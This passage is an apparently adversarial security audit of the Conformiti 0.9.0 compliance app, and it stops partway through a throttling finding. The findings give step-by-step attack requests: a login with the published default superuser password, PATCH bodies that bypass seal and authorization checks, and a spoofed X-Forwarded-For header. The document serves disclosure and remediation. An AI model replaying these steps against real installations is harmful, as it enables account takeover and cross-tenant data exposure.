# Conformiti 0.9.0 — adversarial review
**Date:** 2026-09-07 · **Scope:** the complete repository at v0.9.0 (`0ded621`) · **Method:** a 16-dimension adversarial sweep by independent reviewers, each candidate finding then attacked by three verifiers with different lenses — can the attack actually be carried out, does the cited code really say this, and is it already mitigated somewhere. A finding is listed here only if at least two of the three could not kill it.
**Result:** 69 candidates, **50 confirmed**, 5 contested, 14 killed in verification.
| Severity | Confirmed |
|---|---|
| critical | 3 |
| high | 25 |
| medium | 12 |
| low | 10 |

Remediated in this pass are marked **FIXED**; the rest are open and ordered by severity.

---

## [CRITICAL] The shipped Docker stack seeds a superuser with the published password DemoPass123! by default, and /api/health/ tells the internet it is live

**Dimension:** public-surface  
**Where:** backend/entrypoint.sh:41-49; docker-compose.yml:63 (and its header comment, line 5-10); backend/accounts/management/commands/bootstrap_demo.py:31,162; backend/config/health.py:18-26,79

**Mechanism.** `entrypoint.sh:41` is `case "${SEED_DEMO_DATA:-true}" in` — the default when the variable is unset is **true**, and `docker-compose.yml:63` passes `SEED_DEMO_DATA: ${SEED_DEMO_DATA:-true}`, so it is also true when the operator supplies no `.env`. That runs `python manage.py bootstrap_demo` (entrypoint.sh:45) on every first boot of the production compose stack. `bootstrap_demo.py:31` declares `DEMO_USERS = [("admin", "Ada", "Admin", "Administrator", True), ...]` and `:158,162` create it with `is_staff=is_super, is_superuser=is_super` and `user.set_password("DemoPass123!")`. The password is printed in the repo in four places (`bootstrap_demo.py:147`, `docker-compose.yml:10`, `.env.example:172`, `install.ps1:212`). Nothing forces a password change, no MFA is enrolled for the account, and nothing gates the seeding on `DEBUG` — the compose header at docker-compose.yml:5 claims "the defaults below are production-safe (DEBUG off, a strong secret key…)" in the same file that defaults demo seeding on. Separately, `config/health.py:62-83` is `AllowAny`, `authentication_classes = []`, `throttle_classes = []` and returns `"demo_accounts": demo_accounts_present()` (`:79`), which is exactly `User.objects.filter(username__in=("admin","mia","owen","aria","val"), email__endswith="@example.com", is_active=True).exists()` (`:24-26`). That is a precise, unauthenticated, unthrottled oracle for "this install still has the published superuser credential".

**Attack.** Attacker sends `GET https://target/api/health/` with no credentials. Response contains `"demo_accounts": true`. Attacker then sends `POST /api/auth/token/` with `{"username":"admin","password":"DemoPass123!"}` and receives an access+refresh pair for an account with `is_superuser=True`. From there: `/admin/` (SessionAuthentication is globally enabled, config/settings.py:374), every tenant model in the Django admin, and — because `accounts/tenancy.py:159-167` honours `X-Workspace` for superusers only — `GET /api/documents/ -H 'X-Workspace: <any slug>'` reads every other workspace's evidence. Internet-wide, this is a one-request scan (`/api/health/`) followed by one login. An operator who ran `install.sh` without `--no-demo`, or `docker compose up -d --build` exactly as docker-compose.yml:3 instructs, is vulnerable.

**Guard checked.** I looked for (a) a DEBUG/production gate inside `bootstrap_demo.Command.handle` — there is none, the command runs unconditionally; (b) a forced password change or `has_usable_password` reset on the demo users — `grep -rn "must_change|force_password"` over the backend returns nothing; (c) MFA enrolment for the seeded admin — `bootstrap_demo.py` never touches `MfaDevice`; (d) a test asserting the command refuses in production — `config/tests.py:62-100` only asserts `check_password("DemoPass123!")` succeeds. The only mitigations are prose: `.env.example:173` ("Set to false for a real deployment") and the yellow `install.sh:132` / `install.ps1:116` reminder to run `remove_demo_data` afterwards. A printed reminder is not a control, and it is absent entirely from the `docker compose up` path the compose file itself documents as the way to run the stack.

**Fix.** Invert the default: `case "${SEED_DEMO_DATA:-false}"` in backend/entrypoint.sh:41 and `SEED_DEMO_DATA: ${SEED_DEMO_DATA:-false}` in docker-compose.yml:63, so demo data is opt-in. As defence in depth, have `bootstrap_demo.Command.handle` refuse when `not settings.DEBUG` unless an explicit `--i-know-this-is-a-demo` flag is passed, and generate a random password printed to stdout instead of the constant at bootstrap_demo.py:162.

---

## [CRITICAL] The login page prints working superuser credentials to anonymous visitors, and the shipped production stack seeds those accounts by default

**FIXED in this pass.**

**Dimension:** frontend  
**Where:** frontend/src/pages/Login.jsx:308-313; backend/config/health.py:62-83 (:79); docker-compose.yml:63; backend/entrypoint.sh:41-45; backend/accounts/management/commands/bootstrap_demo.py:151-163; install.sh:38,94; install.ps1:59

**Mechanism.** `Login.jsx:54-56` fetches `/api/health/` with a bare axios call before any authentication. `config/health.py:62-65` declares `authentication_classes = []`, `permission_classes = [AllowAny]`, `throttle_classes = []`, and its body returns `"demo_accounts": demo_accounts_present()` (`:79`), which is true whenever any of `admin, mia, owen, aria, val` still exists active with an `@example.com` address (`:21-26`). `Login.jsx:308-313` then renders, to that anonymous visitor: `Demo accounts: admin / DemoPass123!` with `also mia · owen · aria · val`. Those are real credentials: `bootstrap_demo.py:151-163` creates each `DEMO_USERS` row with `is_staff=is_super, is_superuser=is_super` and `user.set_password("DemoPass123!")` — `admin` is a Django superuser, i.e. the one principal that may cross workspaces with `X-Workspace` (`accounts/tenancy.py:159-167`). The seeding is the default in the production-posture stack, not a dev-only path: `docker-compose.yml:63` sets `SEED_DEMO_DATA: ${SEED_DEMO_DATA:-true}` while `:22` sets `DJANGO_DEBUG: ${CONFORMITI_DEBUG:-false}`, and `backend/entrypoint.sh:41-45` runs `python manage.py bootstrap_demo` on `${SEED_DEMO_DATA:-true}`. `install.sh:38` and `install.ps1:59` make demo data opt-out (`--no-demo` / `-NoDemo`), not opt-in. The hint is gated only on "the demo rows still exist" — never on `DEBUG`, never on a deployment flag.

**Attack.** Run the documented install (`./install.sh`, or `docker compose up` with no `.env` overrides) and expose port 80. An unauthenticated attacker who can reach the site opens `/login`, reads `admin / DemoPass123!` off the page (or scripts it: `GET /api/health/` is unauthenticated, unthrottled, and returns `demo_accounts: true`), and signs in as a superuser. From there: every workspace on the installation via the `X-Workspace` header, every evidence document, every sealed audit package, and the Django admin. No brute force, no CSRF, no XSS — the credentials are published in the page body.

**Guard checked.** I looked for a DEBUG gate, an env flag, and a forced password change. `health.py` has none — the view is unconditionally `AllowAny` with `throttle_classes = []`, and the `demo_accounts` key is emitted whenever the DB answers. `Login.jsx:308` gates only on `health?.demo_accounts`. The only guards that exist are advisory: `install.sh:132` and `install.ps1:116` print "Before real use: docker compose exec backend python manage.py remove_demo_data" as console text after the install, and `accounts/management/commands/remove_demo_data.py` exists — but nothing enforces it, nothing warns inside the running product, and the installer's own success banner (`install.sh:131,227`) re-advertises the same password. `bootstrap_demo.py` sets no `must_change_password` flag; `set_password("DemoPass123!")` is the final state.

**Fix.** Two changes, either of which closes it, both of which are cheap. (1) In `config/health.py:79`, only emit `demo_accounts` when `settings.DEBUG` — `"demo_accounts": demo_accounts_present() if (db_ok and settings.DEBUG) else None` — so the hint at `Login.jsx:308` cannot fire on a DEBUG-off deployment. (2) Flip the default to opt-in: `SEED_DEMO_DATA: ${SEED_DEMO_DATA:-false}` in `docker-compose.yml:63` and `${SEED_DEMO_DATA:-false}` in `backend/entrypoint.sh:41`, with `install.sh`/`install.ps1` taking `--demo`/`-Demo` instead of `--no-demo`/`-NoDemo`. Additionally, have `bootstrap_demo` refuse to run when `DEBUG` is off unless an explicit `--force` is passed.

---

## [CRITICAL] Sealed-manifest workpaper fields stay writable after sealing: any PATCH that also touches a conclusion or the management response bypasses assert_open and silently desynchronises the row from the signed manifest

**FIXED in this pass.**

**Dimension:** integrity-races  
**Where:** backend/attestations/views.py:409-441 (PackageControlViewSet.perform_update); manifest fields at backend/attestations/bundle.py:27-59 (control_payload); guard that is skipped at backend/attestations/views.py:437-441

**Mechanism.** `perform_update` splits the request into three branches by which fields are present. `auditor_fields` (views.py:413-414) and `management_response` (`:416`) each get their own branch, and ONLY the third branch — `if not (touching_conclusions or touching_response)` (`:437-441`) — calls `assert_open(row.package)`. But the branch bodies call `serializer.save(...)` (`:425-427`, `:434-436`), and DRF's `ModelSerializer.update()` applies the WHOLE of `validated_data`, not just the fields that branch was reasoning about. `PackageControlSerializer` (attestations/serializers.py:170-201) leaves `note`, `population_size`, `population_source` and `sampling_method` writable; all four are sealed into the manifest — `bundle.control_payload` emits `"note": row.note` (bundle.py:39) and `"population": {"size": row.population_size, "source": row.population_source, "sampling_method": row.sampling_method}` (bundle.py:47-51). The model comment at attestations/models.py:315-317 states the population is "stated by the organisation while the package is a draft and sealed with it", and the module docstring at views.py:5-11 promises "every write is refused unless the package is still a draft, checked at the view". Neither holds. Nothing recomputes the manifest afterwards: `verify` (views.py:310-325) and `verify_pins` (attestations/snapshot.py:95-116) only re-hash evidence FILES, so the divergence is invisible to every check the product offers.

**Attack.** Proven by execution against the real suite fixtures (throwaway in-memory test DB, no project files modified). Manager drafts a package, sets population size 42 / source "HR termination report" / method "random" / note "org note", seals it (manifest records exactly those), and issues it to auditor `aria`. (a) AUDITOR SIDE: `PATCH /api/package-controls/{id}/ {"design_conclusion":"no_exceptions","population_size":1,"population_source":"rewritten by auditor","sampling_method":"judgmental","note":"auditor rewrote this"}` returns 200 and the live row becomes size=1/source='rewritten by auditor'/method='judgmental'/note='auditor rewrote this' — while the same fields sent alone return 403 ("You cannot change this row."), which is the documented, tested guard (attestations/tests_samples.py:99). (b) ORGANISATION SIDE: `PATCH {"management_response":"we agree","population_size":7,"note":"org rewrote after seal"}` returns 200 on the sealed package. Then `GET /api/evidence-packages/{id}/verify/` returns `ok=True, discrepancies=[]`, `manifest_sha256` is unchanged, and `GET .../export/` produces a bundle in which `manifest.json` says population {size:42, source:'HR termination report'} while `controls.csv` in the SAME zip says `1, rewritten by auditor, Judgmental` — and `INTEGRITY.txt` reads "OK: every file matches the digest recorded when the package was sealed." An auditor sampling 1 item out of a population the organisation later shrinks from 42 to 1, or an organisation quietly restating the population an adverse conclusion was reached against, is exactly the corruption the seal exists to prevent.

**Guard checked.** `assert_open` (views.py:60-65) is the intended guard and is correct, but is reachable only from the third branch (`:440`). `PackageControlSerializer.validate()` (serializers.py:190-201) checks only `not_tested_reason` and never looks at package status. `access.live_grant` (attestations/access.py:67-83) does constrain writers to `package__status=SEALED` + active Auditor, so it stops outsiders — it does not stop the grantee. The sibling viewset shows the correct pattern twice: `PackageSampleViewSet.perform_update` (views.py:552-565) partitions ITEM_FIELDS vs RESULT_FIELDS and refuses `sealed_in` items, and `PbcRequestViewSet.perform_update` (attestations/pbc_views.py:116-120) rejects any key outside `EDITABLE` outright. `attestations/tests.py:148` (`test_a_sealed_package_is_read_only`) and `tests_samples.py:99` cover only the single-field case, which is why this survived.

**Fix.** Make each branch save only its own field set instead of the whole payload, and refuse anything else on a non-draft package. Concretely, at the top of `perform_update` add the PbcRequest pattern: `allowed = auditor_fields | {"management_response"}; if not row.package.is_open and (set(data) - allowed): assert_open(row.package)`, and pass explicit field lists to the two `serializer.save()` calls (or drop the out-of-branch keys from `serializer.validated_data`) so a conclusion write can never carry `note`/`population_*`/`sampling_method` with it.

---

## [HIGH] PATCH /api/package-evidence/{id}/ re-points `document` with no `assert_pinnable`, turning a draft package into a read of any document in the workspace

**FIXED in this pass.**

**Dimension:** tenant-write  
**Where:** backend/attestations/views.py:618-623 (perform_update); backend/attestations/serializers.py:138-150 (field list); backend/attestations/views.py:651-672 (/file/); guard that exists only on create: backend/attestations/views.py:611 + backend/attestations/access.py:86-98

**Mechanism.** `PackageEvidenceSerializer.Meta.fields` (attestations/serializers.py:138-143) lists `"package_control", "document"` and `read_only_fields` (:146-150) does NOT include either, so both are writable on PATCH. `perform_update` is three lines:

```python
def perform_update(self, serializer):
    row = self.get_object()
    if not access.can_assemble(self.request.user):
        raise PermissionDenied("You cannot change this package.")
    assert_open(row.package_control.package)
    serializer.save()
```
(attestations/views.py:618-623). `row = self.get_object()` re-fetches the *pre-update* instance, so `assert_open` validates the OLD package, and nothing validates the new `document` or the new `package_control`. Compare `perform_create` (:603-616), which calls `access.assert_pinnable(self.request.user, document)` — the function whose own docstring says "Without this check the packaging step becomes a way to launder access to folders the packager was never granted" (attestations/access.py:86-93). The document field's queryset is `Document._default_manager`, which pins to the workspace but applies no folder ACL. `/api/package-evidence/{id}/file/` then serves `row.document.file` (attestations/views.py:672) with the deliberate folder-permission bypass, and the snapshot columns (`document_name`, `content_sha256`, `pinned_version`) are read-only, so the row keeps describing the original file.

**Attack.** Actor: an account whose role has `can_manage_frameworks` but not `can_view_all` / `can_manage_folders` — the exact role `access.readable_packages` is written for ("A frameworks role without view-all reads only what it assembled", attestations/access.py:49-52). Roles are fully user-defined via `/api/roles/` (accounts/views.py:28-56, all six flags settable). 1) `POST /api/evidence-packages/` — creates a draft they can read. 2) `POST /api/evidence-packages/{id}/add_controls/` with `with_evidence:false`. 3) `POST /api/package-evidence/` pinning one document from a folder they *can* see (passes `assert_pinnable`). 4) `PATCH /api/package-evidence/{row}/ {"document": <id of a document in a folder they have no grant on — e.g. the HR or legal-hold folder>}` — 200, no check. 5) `GET /api/package-evidence/{row}/file/` returns those bytes, labelled with the old `document_name`. Document ids are small sequential integers and `/api/control-evidence/choices/` plus the folder tree make enumeration easy. The same PATCH also accepts `package_control`, letting the row be moved onto a control of a *sealed, already-issued* package (`assert_open` looked at the draft), where the auditor's live grant will serve it — outside the signed manifest, and skipped by the bundle because `member_path` is empty (attestations/bundle.py:429-431).

**Guard checked.** I looked for the guard in four places. (a) `PackageEvidenceSerializer` has no `validate()` and no `validate_document()` (attestations/serializers.py:130-166). (b) `PackageEvidence.save()` is the plain `TenantModel.save` (attestations/models.py:281-333, accounts/tenancy.py:322-324) — no `clean()`, no signal. (c) `get_queryset` (attestations/views.py:598-601) constrains only which row you may address, not what you may point it at. (d) `access.assert_pinnable` is called from exactly two sites, `attestations/views.py:611` and — for the PBC twin — inline at `attestations/pbc_views.py:291-292`; grep shows no third call site, so the update path is uncovered. The workspace filter does stop this crossing tenants (`Document._default_manager` is pinned), which is why this is intra-tenant.

**Fix.** Add `"package_control", "document"` to `PackageEvidenceSerializer.Meta.read_only_fields` (attestations/serializers.py:146-150). Re-pinning should go through delete + `POST /api/package-evidence/`, which already runs `assert_pinnable` and re-snapshots the digest. If the fields must stay writable, `perform_update` has to call `access.assert_pinnable(user, new_document)`, re-run `pin_document`'s snapshot, and `assert_open(new_package_control.package)` on the destination as well as the source.

---

## [HIGH] PATCH /api/package-samples/{id}/ with only `package_control` runs no authorization check at all, letting an issued auditor write a row into a sealed package they were never issued

**FIXED in this pass.**

**Dimension:** tenant-write  
**Where:** backend/attestations/views.py:557-580 (PackageSampleViewSet.perform_update); backend/attestations/views.py:497-498 (ITEM_FIELDS / RESULT_FIELDS); backend/attestations/serializers.py:92-105 (field list)

**Mechanism.** `perform_update` gates everything on two field sets:

```python
ITEM_FIELDS = {"identifier", "description", "population_ref", "evidence"}
RESULT_FIELDS = {"result", "exception_note"}
...
touching_result = bool(self.RESULT_FIELDS & set(data))
touching_item   = bool(self.ITEM_FIELDS  & set(data))
if package.status == EvidencePackage.Status.WITHDRAWN:
    assert_open(package)
extra = {}
if touching_result:  ...live_grant check...
if touching_item:    ...can_assemble / sealed_in check...
serializer.save(**extra)
```
(attestations/views.py:497-498, 557-575). `package_control` is in `PackageSampleSerializer.Meta.fields` (serializers.py:95) and absent from `read_only_fields` (:101-104), but it is in neither guard set. A PATCH body containing only `package_control` therefore makes both flags False, skips every branch, and falls straight to `serializer.save()` — the only surviving checks are `IsAuthenticated` (attestations/views.py:493) and `get_queryset` (:504-507), which merely require that the sample's *current* package is readable. The destination `package_control` is validated by DRF against `PackageControl._default_manager`, i.e. workspace-pinned only — not restricted to `access.readable_packages`. Note the sibling `_check_evidence` helper (:509-512) is called with `row = sample.package_control`, the pre-update row, so it never sees the new parent either.

**Attack.** Actor: an external auditor account (`is_auditor`) holding one live `PackageGrant` on sealed package X. 1) `POST /api/package-samples/ {"package_control": <a control row of X>, "identifier": "..."}` — allowed by `perform_create` (attestations/views.py:534-538: sealed + live grant). 2) `PATCH /api/package-samples/{id}/ {"package_control": <a PackageControl id belonging to package Y>}` where Y is another engagement in the same workspace that the auditor has no grant on. 200, no permission branch taken. The row now hangs off Y's workpaper and is rendered to Y's readers through `PackageControlSerializer.samples` (attestations/serializers.py:167-168) and included in Y's `/export/` summary counts. The same PATCH also works in reverse on a sample the organisation listed and sealed into X's manifest: `sealed_in` is only consulted under `touching_item` (:571-574), so a manifest-listed sample can be silently moved to a different control row while the signed `manifest_json` still records the original placement — a live workpaper that disagrees with the signature the auditor verified offline. PackageControl ids are small sequential integers.

**Guard checked.** `PackageSampleSerializer.validate()` (attestations/serializers.py:113-127) only enforces "a FAIL needs an exception_note" — it never looks at `package_control`. `PackageSample.Meta` (models.py:270-278) has `unique_together = ("package_control", "identifier")`, which DRF turns into a UniqueTogetherValidator; that rejects only a name collision, not a foreign destination. `get_queryset` filters on `package_control__package__in=access.readable_packages(...)`, but that is evaluated against the row's existing parent, before the write. The module docstring (attestations/views.py:486-492) states the intended rule — "the organisation lists items while the package is a draft ... the issued auditor adds their own selections" — and `perform_destroy` (:576-589) does implement it; only `perform_update` has the hole. There is no test covering a `package_control` change on a sample (grep of attestations tests finds none).

**Fix.** Add `"package_control"` to `PackageSampleSerializer.Meta.read_only_fields` (attestations/serializers.py:101-104) — a sample belongs to the control row it was selected for; moving it should be delete + create. Failing that, treat `package_control` as an item field (add it to `ITEM_FIELDS`, attestations/views.py:497) *and* re-run the destination checks against the new row: `dest.package in access.readable_packages(user)` plus the same open/sealed/`live_grant` ladder `perform_create` applies.

---

## [HIGH] Audit rows are stamped from `user.workspace_id`, so a superuser working under X-Workspace files another tenant's document and package names into their own workspace's audit log — and leaves no trace in the tenant they acted on

**Dimension:** tenant-write  
**Where:** backend/audit/models.py:8-16 (`tenant_parent = "user"`); backend/accounts/tenancy.py:305-320 (assign_workspace precedence); backend/audit/middleware.py:109-112; backend/audit/events.py:106-112 and :127-134; backend/accounts/tenancy.py:159-167 (X-Workspace); backend/accounts/migrations/0008_workspaces.py:15-18

**Mechanism.** `AuditLog` declares `tenant_parent = "user"` (audit/models.py:12) with a nullable `workspace` (:13-16). `TenantModel.assign_workspace` resolves the parent *before* the active workspace:

```python
if self.tenant_parent and getattr(self, f"{self.tenant_parent}_id", None):
    wid = getattr(self, self.tenant_parent).workspace_id
if wid is None:
    wid = current_id()
```
(accounts/tenancy.py:310-313). So for any authenticated writer the row is filed under `request.user.workspace_id`, never under the workspace the request actually operated in. That is correct for the sign-in case the comment justifies (audit/models.py:9-11), and correct for every non-superuser, because `workspace_id_for` returns `user.workspace_id` for them (accounts/tenancy.py:168-169). It is wrong for a superuser, who is the one principal whose active workspace can differ from their own: `workspace_id_for` honours `X-Workspace` only `if wanted and user.is_superuser` (accounts/tenancy.py:159-167), and the SPA sends that header on every call (frontend/src/api/client.js:102). Migration 0008 gives the pre-existing superuser a non-null workspace — `apps.get_model("accounts", name).objects.filter(workspace__isnull=True).update(workspace=ws)` over `("Role", "User")` (accounts/migrations/0008_workspaces.py:15-18) — so on every upgraded install the operator's account is pinned to `default` and the `wid is None` fallback never fires. Every writer is affected: the request middleware (`AuditLog.objects.create(user=user, ...)`, audit/middleware.py:109-112), `record_evidence_read` whose `detail` is `f"downloaded {label}: {document.name}"` (audit/events.py:106-112), and `record_package_event` whose detail carries package names and manifest digests (audit/events.py:127-134, e.g. attestations/views.py:245-250).

**Attack.** No attacker needed for the write; an attacker is needed only to read it. Operator (superuser, `workspace_id = default` per migration 0008) creates workspace "acme" via `POST /api/workspaces/`, switches with `X-Workspace: acme`, and does normal support work — opens a document, downloads evidence, exports a package. Each action writes an `AuditLog` row whose `workspace_id` is `default`, with `object_type="documents"`, Acme's `object_id`, and `detail` = `downloaded v3: 2026 Penetration Test — Acme Payments.pdf` or `sha256=… sealed package 41 with 63 item(s): Acme SOC 2 Type II`. Consequence 1 (cross-tenant exposure): `GET /api/audit-log/` in workspace `default` is open to any account there with `can_manage_users` OR `is_auditor` OR `can_view_all` (audit/views.py:17-25) — including an external audit firm's Auditor account issued for `default`'s own engagement. Its pinned queryset returns those rows because they carry `workspace_id = default`, so that outside firm reads Acme's document names, package names, manifest digests and object ids. `search_fields` (audit/views.py:31-34) makes it greppable. Consequence 2 (audit gap): `GET /api/audit-log/` inside Acme, pinned to Acme, returns nothing for any of it — the disclosure trail that `record_evidence_read`'s docstring calls "the act an auditor most needs to be able to reconstruct afterwards" (audit/events.py:98-100) is silently absent from the tenant whose evidence was read.

**Guard checked.** The union in `AuditLogViewSet.get_queryset` (audit/views.py:38-48) is not a guard here: it only ORs in `workspace__isnull=True` orphans, and these rows have a real, wrong workspace id. `record_login_attempt` shows the team already knows the pattern and passes `workspace_id=workspace_id` explicitly (audit/events.py:38-44), and `accounts/oidc.py:559-565` does the same for SSO refusals — but the four request-path writers do not. The test suite covers the adjacent cases and stops exactly short of this one: `test_superuser_switches_with_the_header` (accounts/tests_tenancy.py:192-206) asserts the *Risk* created under `X-Workspace: beta` lands in Beta but never inspects the AuditLog row the same POST produced, and `test_login_audit_entry_is_stamped_with_the_persons_workspace` (:256-268) pins the opposite, sign-in case. Nothing in `WorkspaceMiddleware` or `_RequestResolver` re-stamps the row.

**Fix.** Prefer the active workspace and fall back to the person's, rather than the reverse, for this model: drop `tenant_parent = "user"` from `audit/models.py:12` so `assign_workspace` uses `current_id()`, and pass `workspace_id=user.workspace_id` explicitly at the two places where there genuinely is no active workspace (`record_login_attempt`, already doing so at audit/events.py:38-44, and `record_auth_event`). Add a test asserting that a mutation made under `X-Workspace: beta` produces an AuditLog row with `workspace_id == beta.pk`.

---

## [HIGH] A superuser's writes inside a switched workspace are audited into their own workspace, so the tenant's audit trail — and the signed audit-trail extract inside the sealed bundle — silently omit them

**Dimension:** tenancy-mechanism  
**Where:** backend/audit/models.py:12 (tenant_parent = "user"); backend/accounts/tenancy.py:305-320 (assign_workspace precedence); backend/audit/middleware.py:109-112; backend/attestations/bundle.py:269-291 (trail_csv)

**Mechanism.** `AuditLog` sets `tenant_parent = "user"` (audit/models.py:12). `TenantModel.assign_workspace` gives the parent precedence over the active workspace: `if self.tenant_parent and getattr(self, f"{self.tenant_parent}_id", None): wid = getattr(self, self.tenant_parent).workspace_id` (tenancy.py:310-311), and only falls back to `current_id()` when that is None (tenancy.py:312-313). Meanwhile the *data* row is stamped from the active workspace, which for a superuser is whatever `X-Workspace` names (tenancy.py:159-167). So the two diverge: the risk/document/package lands in workspace B, the audit row lands in the actor's own workspace A. I proved it against an in-memory test DB using the project's own TwoWorkspaces fixture: superuser (workspace 1) POSTs `/api/risks/` with `X-Workspace: beta` → `Risk.workspace_id = 2`, `AuditLog.workspace_id = 1`, detail `POST /api/risks/ fields=title`. Beta's own administrator querying `/api/audit-log/?action=create` got `set()` — nothing. Alpha's log got the row. The superuser's own orphan-union in audit/views.py:41-47 does not help either: it unions `workspace__isnull=True`, not other workspaces' rows. `attestations/bundle.py:283` builds the auditor-facing `trail_csv` with `AuditLog.objects.filter(object_type="documents", object_id__in=document_ids)` — a pinned queryset — so those rows are absent from the audit-trail extract shipped inside the sealed, Ed25519-signed bundle, which the README presents as complete.

**Attack.** Platform operator (or anyone who reaches a superuser account) sends `X-Workspace: <customer-slug>` on any mutating API call — add/remove evidence links, edit a risk, pin or unpin package evidence, change a folder permission. The change takes effect in the customer's workspace (verified: Risk.workspace_id = beta) and the customer's `/api/audit-log/` shows nothing (verified: empty result set for Beta's administrator). If that customer then seals an audit package, `trail_csv` (bundle.py:283) omits the same rows, and the omission is inside the digest the manifest signs, so it verifies clean. The mirror-image effect is a small cross-tenant metadata write: the actor's own workspace receives audit rows naming another tenant's HTTP path, object type, object id and request field names (`_summarise_body`, audit/middleware.py:40-63), readable by anyone in workspace A with can_manage_users / is_auditor / can_view_all (audit/views.py:17-25).

**Guard checked.** I looked for (a) an explicit `tenancy.scoped()` or workspace override at the AuditLog write — `audit/middleware.py:109-112` and `audit/events.py` pass no workspace; (b) a superuser-visibility escape in the audit viewset — `audit/views.py:41-47` unions only `workspace__isnull=True` orphans, not foreign-workspace rows; (c) a test — `accounts/tests_tenancy.py:256-266` (`test_login_audit_entry_is_stamped_with_the_persons_workspace`) asserts the *login* case, where actor workspace and target workspace coincide, and `test_superuser_switches_with_the_header` (:192-206) asserts only that the created Risk lands in Beta; nothing asserts where the matching audit row lands. My probe reproduced the divergence with that exact fixture.

**Fix.** Stamp AuditLog from the active workspace, not from the actor: drop `tenant_parent = "user"` (audit/models.py:12) so `assign_workspace` falls through to `current_id()` (tenancy.py:312-313). The anonymous sign-in cases the current design serves are already handled — the login path runs with no workspace active and the nullable column (audit/models.py:13-16) plus the orphan union (audit/views.py:41-47) covers them — so pass the person's workspace explicitly at those few sites (`accounts/serializers.py` login, `accounts/oidc.py:559-565` already does exactly this) instead of inferring it for every row. Add a test asserting that a superuser acting under `X-Workspace: beta` produces an audit row with `workspace_id == beta.pk` and that Beta's administrator can read it.

---

## [HIGH] One installation-wide Ed25519 signing key plus a manifest with no tenant identity: any workspace can seal a bundle that verifies against the fingerprint another workspace published

**Dimension:** tenancy-mechanism  
**Where:** backend/attestations/models.py:383 (SigningKey is a plain models.Model, not TenantModel); backend/attestations/signing.py:88-116 (one SIGNING_KEY_FILE per installation); backend/attestations/manifest.py:84-114 (manifest payload); backend/attestations/bundle.py:110-137, 353-360; backend/attestations/views.py:368-373

**Mechanism.** The private key is one file or env var for the whole process — `load_private_key` reads `settings.SIGNING_KEY` then `settings.SIGNING_KEY_FILE` (signing.py:88-116), defaulting to `BASE_DIR/.package-signing-key` (config/settings.py:699). `SigningKey` is `models.Model`, not `TenantModel` (attestations/models.py:383), so the published key list is installation-wide, and `GET /api/signing-keys/` serves it with `authentication_classes = []`, `AllowAny` (views.py:368-373). The signed bytes are `package.manifest_json` (signing.py:185-198), and `build_manifest` (manifest.py:84-114) / `package_payload` (bundle.py:110-137) carry no workspace, organisation, tenant slug or any other tenant-derived identifier — only free-text `name`, `engagement`, `audit_firm`, a globally-unique `id`, and snapshotted user display names. The bundle README nonetheless tells the auditor at bundle.py:355-358: "the signature proves the manifest was signed by the holder of the organisation's signing key at the time of sealing. Compare the key fingerprint above with the one the organisation published." That sentence was true when installation == organisation; 0.9.0 broke the equivalence and nothing here was updated. Proven empirically: sealing one package under workspace 1 and one under workspace 2 with the project's own fixture produced `key_id=4986fb96d2e718ea` and fingerprint `4986fb96d2e718ea4a15f816…` for both, and `GET /api/signing-keys/` returned that same single current key.

**Attack.** Tenant B's compliance manager — an ordinary in-tenant role, `can_assemble` is just `can_manage_frameworks` (attestations/access.py:21-27), no superuser needed — creates a package in their own workspace named `"Acme Corp SOC 2 Type II FY26"` with `engagement="Acme Corp"` and `audit_firm="<tenant A's audit firm>"`, fills it with fabricated evidence, and seals it (`POST /api/evidence-packages/{id}/seal/`, views.py:201-263). Conformiti signs it with the installation key. They export the ZIP and hand it to tenant A's external auditor out of band. The auditor runs the documented offline check — `python3 verify.py .` / `tools/validate.py` / `openssl` — and compares the key fingerprint against the one tenant A published (or against `GET /api/signing-keys/` on the same host, which is unauthenticated). Everything matches, because it is the same key and nothing in the signed bytes names a tenant. The auditor cannot distinguish the forgery from tenant A's genuine bundles. The same gap means tenant A cannot prove a bundle attributed to it was actually sealed in its workspace.

**Guard checked.** I looked for a per-workspace key (SigningKey has no workspace column and no TenantModel base, models.py:383; `load_private_key` takes no workspace argument, signing.py:88), for a workspace or organisation field anywhere in the signed payload (`build_manifest`, manifest.py:84-114, and `package_payload`, bundle.py:110-137 — absent; `readme_text`, bundle.py:293-312, prints engagement and audit firm, both attacker-controlled free text), for a tenant check in the verifier (`attestations/verifier.py` and `tools/validate.py` verify digests and the detached signature only), and for a test (`accounts/tests_tenancy.py` has none touching SigningKey; `attestations/tests_signing.py` is single-workspace). The signing module's own threat statement (signing.py:26-30) reasons at installation granularity and never mentions a second workspace.

**Fix.** Bind the signature to the tenant. Minimum: add the workspace slug and id to the signed manifest — one key in `package_payload` (bundle.py:110-137) carried into `build_manifest` (manifest.py:84-114) under a bumped `MANIFEST_VERSION` — and have `verify.py`/`tools/validate.py` print it, so an auditor comparing a bundle against a named client sees the tenant inside the signed bytes. Better: make `SigningKey` a `TenantModel` and derive a per-workspace key (e.g. HKDF from the installation key with the workspace slug as info), so each organisation publishes and verifies its own fingerprint. Either way, correct bundle.py:355-358, which currently states a guarantee the code does not provide on a multi-workspace installation.

---

## [HIGH] Every per-IP throttle (login, MFA, refresh, questionnaire, anon) is keyed on an attacker-controlled X-Forwarded-For header, so the only brute-force control in the product is free to bypass

**FIXED in this pass.**

**Dimension:** authn  
**Where:** backend/config/settings.py:369-400 (REST_FRAMEWORK block, no NUM_PROXIES); backend/config/urls.py:19-30 and :57-63; backend/accounts/views.py:193-207; backend/accounts/oidc_views.py:15-20; backend/vendors/public_views.py:18-22; frontend/nginx.conf:49

**Mechanism.** `LoginRateThrottle.get_cache_key` (config/urls.py:28-29) is `self.cache_format % {"scope": ..., "ident": self.get_ident(request)}` and never overrides DRF's `get_ident`. DRF's `BaseThrottle.get_ident` (.venv/Lib/site-packages/rest_framework/throttling.py:23-40) ends with `return ''.join(xff.split()) if xff else remote_addr` — i.e. when `NUM_PROXIES` is `None` it uses **the entire X-Forwarded-For header verbatim** as the throttle identity. `NUM_PROXIES` is DRF's default `None` (.venv/.../rest_framework/settings.py:64) and is not set anywhere in `config/settings.py` (grep for NUM_PROXIES across backend/ returns nothing). The shipped nginx makes this worse rather than better: `proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for` (frontend/nginx.conf:49) *appends* the real peer to whatever the client sent, so the client's prefix always survives. I confirmed it by instantiating the real throttle against a RequestFactory request (read-only, no DB): REMOTE_ADDR=203.0.113.7 with no XFF gives key `throttle_login_203.0.113.7`; with `X-Forwarded-For: attacker-picked-1, 203.0.113.7` it gives `throttle_login_attacker-picked-1,203.0.113.7`. The same `get_ident` path backs `RefreshRateThrottle` (config/urls.py:62), 